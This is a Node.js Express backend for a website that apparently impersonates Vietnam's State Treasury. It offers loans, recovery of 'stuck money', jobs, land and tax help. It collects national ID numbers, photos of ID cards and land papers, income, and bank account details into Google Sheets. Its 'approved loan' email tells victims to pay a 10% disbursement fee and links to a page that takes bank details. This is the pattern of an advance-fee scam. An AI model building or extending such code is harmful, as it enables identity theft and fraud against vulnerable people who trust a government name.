require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { GoogleSpreadsheet } = require('google-spreadsheet');
const { JWT } = require('google-auth-library');
const nodemailer = require('nodemailer');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

// Vietnamese Localization Mapping
const H = {
    TIME: 'Thời gian',
    NAME: 'Họ và tên',
    GENDER: 'Giới tính',
    AGE: 'Tuổi',
    CCCD: 'Số CCCD',
    PHONE: 'Số điện thoại',
    EMAIL: 'Email',
    ADDRESS: 'Địa chỉ',
    JOB: 'Nghề nghiệp',
    HAS_LOAN: 'Đã từng vay',
    INCOME: 'Thu nhập',
    AMOUNT: 'Số tiền vay',
    REFERRAL: 'Mã giới thiệu',
    URL_FRONT: 'Ảnh mặt trước',
    URL_BACK: 'Ảnh mặt sau',
    STATUS: 'Trạng thái',
    TOKEN: 'Mã định danh (Token)',
    MAIL_SENT: 'Đã gửi email',
    EDUCATION: 'Trình độ',
    TAX_ID: 'Mã số thuế',
    QR: 'Mã QR Thanh toán',
    BANK_OWNER: 'Chủ tài khoản',
    BANK_NAME: 'Ngân hàng',
    BANK_NAME: 'Ngân hàng',
    BANK_ACC: 'Số tài khoản',
    MONTHLY_INCOME: 'Thu nhập hàng tháng',
    URL_BILL: 'Ảnh Bill',
    URL_LAND_PAPER: 'Ảnh Sổ đỏ/Giấy tờ',
    DESIRED_JOB: 'Ngành nghề mong muốn',
    PREFERRED_LOCATION: 'Khu vực/Địa chỉ mong muốn',
    EXPERIENCE: 'Kinh nghiệm làm việc',
    DISPUTE_CONTENT: 'Nội dung tranh chấp'
};

// Using underscores instead of spaces to avoid 400 "Unable to parse range" errors
const T = {
    LOAN: 'ĐĂNG_KÝ_VAY_VỐN',
    DISBURSE: 'DANH_SÁCH_GIẢI_NGÂN',
    STUCK_MONEY: 'HỖ_TRỢ_TIỀN_TREO',
    JOB_SEARCH: 'TÌM_VIỆC_LÀM_PHÁP_LÝ',
    LAND_LEGAL: 'GIẢI_QUYẾT_ĐẤT_ĐAI',
    TAX_SUPPORT: 'KÊ_KHAI_THUẾ_PHÁP_LÝ'
};

// Multer Config
const UPLOADS_DIR = 'uploads';
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, UPLOADS_DIR);
    },
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({ storage: storage }).any();

const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    },
    tls: {
        rejectUnauthorized: false
    }
});

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));
app.use('/uploads', express.static(UPLOADS_DIR));

// Health check endpoint for cron job to keep Render awake
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

// Email Content Helper
const getEmailContent = (service, fullName, token) => {
    const appUrl = process.env.FRONTEND_URL || 'https://vay-nhannuoc-ekxy.vercel.app';
    const verifyLink = `${appUrl}/?token=${token}`;

    const contents = {
        'vay-von': {
            subject: 'Hồ sơ vay vốn của bạn đã được phê duyệt',
            html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                <p>Chúc mừng! Hồ sơ đăng ký **Vay vốn** của bạn tại Kho bạc Nhà nước đã được phê duyệt thành công.</p>
                <p><b>Lưu ý:</b> Để hoàn tất thủ tục, Quý khách vui lòng chuẩn bị phí giải ngân tương đương <b>10%</b> số tiền vay.</p>
                <p>Vui lòng nhấn vào liên kết dưới đây để cập nhật thông tin ngân hàng và nhận giải ngân:</p>
                <div style="margin: 20px 0;"><a href="${verifyLink}" style="background: #1a4f7a; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px;">NHẬN GIẢI NGÂN NGAY</a></div>
                <p style="color: #666; font-size: 12px;">Nếu liên kết không hoạt động, hãy copy đường dẫn này: ${verifyLink}</p>
            </div>`
        },
        'tien-treo': {
            subject: 'Xác nhận tiếp nhận hồ sơ Hỗ trợ lấy lại tiền treo',
            html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                <p>Chúng tôi đã tiếp nhận yêu cầu **Hỗ trợ lấy lại tiền treo** của bạn thành công.</p>
                <p>Hồ sơ của bạn đang được bộ phận Pháp lý thẩm định. Chúng tôi sẽ liên hệ với bạn trong thời gian sớm nhất qua số điện thoại hoặc email này.</p>
                <p>Cảm ơn bạn đã tin tưởng dịch vụ của Kho bạc Nhà nước.</p>
            </div>`
        },
        'default': {
            subject: 'Xác nhận đăng ký dịch vụ Pháp lý thành công',
            html: `<div style="font-family: Arial; padding: 20px; border: 1px solid #ddd;">
                <h2 style="color: #1a4f7a;">Chào ${fullName},</h2>
                <p>Cảm ơn bạn đã đăng ký dịch vụ tại cổng thông tin Kho bạc Nhà nước.</p>
                <p>Hồ sơ của bạn đã được lưu trữ trong hệ thống. Chúng tôi sẽ xem xét và phản hồi kết quả cho bạn trong vòng 24h làm việc.</p>
                <p>Trân trọng!</p>
            </div>`
        }
    };
    return contents[service] || contents['default'];
};

async function sendMail(to, service, fullName, token = '') {
    if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) return false;
    const content = getEmailContent(service, fullName, token);
    try {
        await transporter.sendMail({
            from: `"Hỗ trợ KBNN" <${process.env.EMAIL_USER}>`,
            to,
            subject: content.subject,
            html: content.html
        });
        return true;
    } catch (e) {
        console.error(`[MAIL ERROR] to ${to}:`, e.message);
        return false;
    }
}

let cachedDoc = null;
const SCOPES = ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive.file'];

async function getDoc(refresh = false) {
    if (!process.env.GOOGLE_SHEET_ID) throw new Error('GOOGLE_SHEET_ID is missing');
    if (!cachedDoc || refresh) {
        let creds;
        if (process.env.GOOGLE_SERVICE_ACCOUNT) {
            creds = JSON.parse(process.env.GOOGLE_SERVICE_ACCOUNT);
        } else {
            creds = require('./google-key.json');
        }
        const auth = new JWT({ email: creds.client_email, key: creds.private_key, scopes: SCOPES });
        const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID, auth);
        await doc.loadInfo();
        cachedDoc = doc;
    }
    return cachedDoc;
}

// Global sheet references
let sheets = { loanSheet: null, legalSheets: {}, bankSheet: null };

async function initSheets() {
    try {
        const doc = await getDoc(true); // Always refresh info on init
        const loanHeaders = [H.TIME, H.NAME, H.GENDER, H.AGE, H.CCCD, H.PHONE, H.EMAIL, H.ADDRESS, H.JOB, H.HAS_LOAN, H.INCOME, H.AMOUNT, H.REFERRAL, H.URL_FRONT, H.URL_BACK, H.STATUS, H.TOKEN, H.MAIL_SENT];
        const legalHeaders = [H.TIME, H.NAME, H.GENDER, H.AGE, H.CCCD, H.PHONE, H.EMAIL, H.REFERRAL, H.EDUCATION, H.TAX_ID, H.MONTHLY_INCOME, H.DESIRED_JOB, H.PREFERRED_LOCATION, H.EXPERIENCE, H.DISPUTE_CONTENT, H.URL_FRONT, H.URL_BACK, H.URL_BILL, H.URL_LAND_PAPER, H.STATUS, H.TOKEN, H.MAIL_SENT];

        const syncSheet = async (oldTitle, newTitle, headers) => {
            // 1. Try to find if a sheet with the NEW title already exists
            let sheet = doc.sheetsByTitle[newTitle];

            // 2. If not, try to find the OLD sheet to rename it
            if (!sheet) {
                sheet = doc.sheetsByIndex.find(s =>
                    s.title.trim() === oldTitle ||
                    (oldTitle === 'DangKyVayVon' && s.index === 0)
                );
            }

            try {
                if (sheet) {
                    if (sheet.title !== newTitle) {
                        console.log(`[SYNC] Attempting rename: "${sheet.title}" -> "${newTitle}"`);
                        try {
                            await sheet.updateProperties({ title: newTitle });
                        } catch (e) {
                            if (e.message.includes('already exists')) {
                                console.log(`[SYNC] "${newTitle}" already exists. Switching to that sheet.`);
                                sheet = doc.sheetsByTitle[newTitle];
                            } else {
                                throw e;
                            }
                        }
                        await new Promise(r => setTimeout(r, 2000));
                    }

                    console.log(`[SYNC] Forcing header update for "${sheet.title}"`);
                    await sheet.setHeaderRow(headers);
                    await new Promise(r => setTimeout(r, 2000));
                    return sheet;
                } else {
                    console.log(`[SYNC] Creating new sheet "${newTitle}"`);
                    const newSheet = await doc.addSheet({ title: newTitle });
                    await new Promise(r => setTimeout(r, 2000));
                    await newSheet.setHeaderRow(headers);
                    await new Promise(r => setTimeout(r, 2000));
                    return newSheet;
                }
            } catch (e) {
                console.error(`[SYNC ERROR] "${newTitle}":`, e.message);
                return sheet || null;
            }
        };

        sheets.loanSheet = await syncSheet('DangKyVayVon', T.LOAN, loanHeaders);
        sheets.bankSheet = await syncSheet('GiaiNgan', T.DISBURSE, [H.TIME, H.TOKEN, H.QR, H.BANK_OWNER, H.BANK_NAME, H.BANK_ACC, H.STATUS]);

        const legalTitlesMap = {
            'tien-treo': { old: 'TienTreo', new: T.STUCK_MONEY },
            'tim-viec': { old: 'TimViecPhapLy', new: T.JOB_SEARCH },
            'dat-dai': { old: 'DatDaiPhapLy', new: T.LAND_LEGAL },
            'nop-thue': { old: 'NopThuePhapLy', new: T.TAX_SUPPORT }
        };

        for (const [key, t] of Object.entries(legalTitlesMap)) {
            sheets.legalSheets[key] = await syncSheet(t.old, t.new, legalHeaders);
        }
        console.log('Google Sheets synchronized successfully.');
    } catch (err) {
        console.error('[INIT SHEETS ERROR]:', err.message);
    }
}

// Initial sync
initSheets();

async function checkAndSendEmails() {
    try {
        if (!sheets.loanSheet) return;

        const allRegSheets = [sheets.loanSheet, ...Object.values(sheets.legalSheets)].filter(s => !!s);
        for (const sheet of allRegSheets) {
            const rows = await sheet.getRows().catch(() => []);
            for (const row of rows) {
                const status = (row.get(H.STATUS) || '').toUpperCase();
                const emailSent = row.get(H.MAIL_SENT);
                const userEmail = row.get(H.EMAIL);
                const fullName = row.get(H.NAME);
                let token = row.get(H.TOKEN);

                if (sheet.title === T.LOAN && status === 'APPROVED' && emailSent !== 'YES' && userEmail) {
                    if (!token) {
                        token = 'tk-' + Math.random().toString(36).substr(2, 9);
                        row.set(H.TOKEN, token);
                    }
                    const sent = await sendMail(userEmail, 'vay-von', fullName, token);
                    if (sent) {
                        row.set(H.MAIL_SENT, 'YES');
                        await row.save();
                    }
                }
            }
        }
    } catch (err) {
        console.error('[MAILER ERROR]:', err.message);
    }
}
setInterval(checkAndSendEmails, 60000);

// Submission Route
app.post('/api/submit', (req, res) => {
    upload(req, res, async (err) => {
        if (err) return res.status(500).json({ result: 'error', message: err.message });

        const data = req.body;
        const files = req.files || [];
        const timestamp = new Date().toLocaleString('vi-VN');
        const service = data.service || 'vay-von';

        const getUrl = (name) => {
            const f = files.find(x => x.fieldname === name);
            return f ? `${req.protocol}://${req.get('host')}/uploads/${f.filename}` : '';
        };
        const fileUrlFront = getUrl('file_front') || getUrl('file');
        const fileUrlBack = getUrl('file_back');
        const fileUrlBill = getUrl('file_bill');
        const fileUrlLand = getUrl('file_land');

        try {
            if (!sheets.loanSheet) await initSheets(); // Retry if not init

            let targetSheet = (service === 'vay-von') ? sheets.loanSheet : sheets.legalSheets[service];
            if (!targetSheet) targetSheet = sheets.loanSheet;

            const rowData = {};
            rowData[H.TIME] = timestamp;
            rowData[H.NAME] = data.fullname;
            rowData[H.GENDER] = data.gender;
            rowData[H.AGE] = data.age;
            rowData[H.CCCD] = data.cccd;
            rowData[H.PHONE] = data.phone;
            rowData[H.EMAIL] = data.email;
            rowData[H.REFERRAL] = data.referralCode || '';
            rowData[H.URL_FRONT] = fileUrlFront;
            rowData[H.URL_BACK] = fileUrlBack;
            rowData[H.STATUS] = 'PENDING';
            rowData[H.TOKEN] = '';
            rowData[H.MAIL_SENT] = 'NO';

            if (service === 'vay-von') {
                rowData[H.ADDRESS] = data.address;
                rowData[H.JOB] = data.occupation;
                rowData[H.HAS_LOAN] = data.hasLoan || 'no';
                rowData[H.INCOME] = data.income;
                rowData[H.AMOUNT] = data.loanAmount;
            } else {
                rowData[H.EDUCATION] = data.education || '';
                rowData[H.TAX_ID] = data.taxId || '';
                rowData[H.MONTHLY_INCOME] = data.monthlyIncome || '';
                rowData[H.URL_BILL] = fileUrlBill || '';
                rowData[H.URL_LAND_PAPER] = fileUrlLand || '';
                rowData[H.DESIRED_JOB] = data.desiredJob || '';
                rowData[H.PREFERRED_LOCATION] = data.preferredLocation || '';
                rowData[H.EXPERIENCE] = data.workExperience || '';
                rowData[H.DISPUTE_CONTENT] = data.disputeContent || '';
            }

            await targetSheet.addRow(rowData);

            if (service !== 'vay-von' && data.email) {
                await sendMail(data.email, service, data.fullname);
            }
            res.json({ result: 'success' });
        } catch (error) {
            console.error('[SUBMIT ERROR]:', error.message);
            res.status(500).json({ result: 'error', message: error.message });
        }
    });
});

app.get('/api/status', async (req, res) => {
    const { token } = req.query;
    let result = { status: 'pending', qr_url: '' };
    try {
        if (!sheets.loanSheet) await initSheets();
        const allRegSheets = [sheets.loanSheet, ...Object.values(sheets.legalSheets)].filter(s => !!s);
        let infoRow = null;
        for (const s of allRegSheets) {
            const rows = await s.getRows().catch(() => []);
            infoRow = rows.find(r => r.get(H.TOKEN) === token);
            if (infoRow) break;
        }

        if (infoRow) {
            result.amount = infoRow.get(H.AMOUNT) || '';
            const infoStatus = (infoRow.get(H.STATUS) || 'PENDING').toUpperCase();
            if (infoStatus === 'PENDING') result.status = 'pending';
            else if (infoStatus === 'APPROVED') {
                const bankRows = await sheets.bankSheet.getRows().catch(() => []);
                const bankRow = bankRows.find(r => r.get(H.TOKEN) === token);
                if (bankRow) {
                    const qrUrl = bankRow.get(H.QR) || '';
                    const bankStatus = (bankRow.get(H.STATUS) || '').toUpperCase();
                    if (bankStatus === 'DONE' || bankStatus === 'SCANNED') result.status = 'done';
                    else if (qrUrl) { result.status = 'qr_ready'; result.qr_url = qrUrl; }
                    else result.status = 'waiting_qr';
                } else result.status = 'approved';
            }
        }
    } catch (err) { }
    res.json(result);
});

app.post('/api/submit-bank', async (req, res) => {
    const { token, bankOwner, bankName, bankAccount } = req.body;
    const timestamp = new Date().toLocaleString('vi-VN');
    try {
        if (!sheets.bankSheet) await initSheets();
        const bankData = {};
        bankData[H.TIME] = timestamp;
        bankData[H.TOKEN] = token;
        bankData[H.BANK_OWNER] = bankOwner;
        bankData[H.BANK_NAME] = bankName;
        bankData[H.BANK_ACC] = bankAccount;
        bankData[H.QR] = '';
        bankData[H.STATUS] = 'PENDING';
        await sheets.bankSheet.addRow(bankData);
        res.json({ result: 'success' });
    } catch (err) {
        res.status(500).json({ result: 'error', message: err.message });
    }
});

app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
